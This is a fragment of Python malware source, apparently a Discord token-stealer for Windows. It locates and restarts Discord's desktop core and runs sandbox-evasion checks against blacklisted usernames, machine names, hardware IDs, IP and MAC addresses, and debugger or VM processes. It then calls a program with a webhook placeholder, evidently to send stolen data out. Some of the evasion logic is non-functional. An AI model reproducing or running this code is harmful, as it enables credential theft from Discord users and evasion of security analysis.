                    if re.search(r'discord_desktop_core-+?', file):
                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
                        if not os.path.exists(core + '\\index.js'):
                            continue
                        return core, file

    def start_discord(self, dir: str):
        update = dir + '\\Update.exe'
        executable = dir.split('\\')[-1] + '.exe'

        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                app = dir + '\\' + file
                if os.path.exists(app + '\\' + 'modules'):
                    for file in os.listdir(app):
                        if file == executable:
                            executable = app + '\\' + executable
                            subprocess.call([update,
                                             '--processStart',
                                             executable],
                                            shell=True,
                                            stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE)
class Debug:
    global tempfolder
    tempfolder = mkdtemp()

    def __init__(self):

        if self.checks():
            self.self_destruct()

    def checks(self):
        debugging = False

        self.blackListedUsers = [
            'WDAccount', 'Abby', 'hmarc', 'patex', 'RDh', 'kEecfMwgj', 'Frank', '5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8M', 'wA',
            'U1', 'test', 'Reg']
        self.blackListedPCNames = [
            'BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1',
            'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ',
            'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P',
            'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
        self.blackListedHWIDS = [
            '7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555',
            '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A',
            '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
        self.blackListedIPS = [
            '88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116',
            '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151',
            '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50',
            '109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143',
            '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97',
            '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167',
            '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107']
        self.blackListedMacs = [
            '00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de',
            '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06',
            '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d',
            '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']
        self.blacklistedProcesses = [
            "httpdebuggerui", "wireshark", "fiddler", "regedit", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64",
            "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "qemu-ga",
            "joeboxcontrol", "ksdumperclient", "ksdumper", "joeer", argv[0]]

        self.check_process()
        if self.get_network():
            debugging = False
        if self.get_system():
            debugging = False

    def check_process(self) -> bool:
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in self.blacklistedProcesses):
                try:
                    pass
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

    def get_network(self) -> bool:
        global ip, mac, github

        ip = requests.get('https://api.ipify.org').text
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        github = "https://github.com/Purora (FOR MORE SOFTWARE)"

        if ip in self.blackListedIPS:
            return False
        if mac in self.blackListedMacs:
            return False

    def get_system(self) -> bool:
        global hwid, username, hostname

        username = os.getenv("UserName")
        hostname = os.getenv("COMPUTERNAME")
        hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
                                       stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()

        if hwid in self.blackListedHWIDS:
            return False
        if username in self.blackListedUsers:
            return False
        if hostname in self.blackListedPCNames:
            return False

    def self_destruct(self) -> None:
        program(__WEBHOOK_HERE__)



if __name__ == '__main__' and os.name == "nt":
    program(__WEBHOOK_HERE__)
